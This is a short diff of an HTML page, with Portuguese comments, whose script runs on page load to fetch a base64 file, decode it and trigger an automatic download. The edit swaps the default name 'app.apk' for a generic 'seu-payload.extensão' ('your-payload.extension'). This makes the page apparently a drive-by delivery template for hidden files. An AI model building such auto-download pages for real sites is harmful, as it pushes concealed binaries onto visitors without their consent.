@@ -6,7 +6,7 @@
   <title>index</title>
 </head>
 <body>
-<!-- Página intencionalmente vazia: ao ser carregada ela busca `base64.txt`, decodifica e inicia o download automático do .apk com o nome original quando possível. -->
+<!-- Página intencionalmente vazia: ao ser carregada ela busca `base64.txt`, decodifica e inicia o download automático do .{extensão} com o nome original quando possível. -->
 <script>
 (async function(){
   try{
@@ -53,7 +53,7 @@
 
     const a = document.createElement('a');
     a.href = url;
-    a.download = filename || 'app.apk';
+    a.download = filename || 'seu-payload.extensão';
     document.body.appendChild(a);
     a.click();
     a.remove();
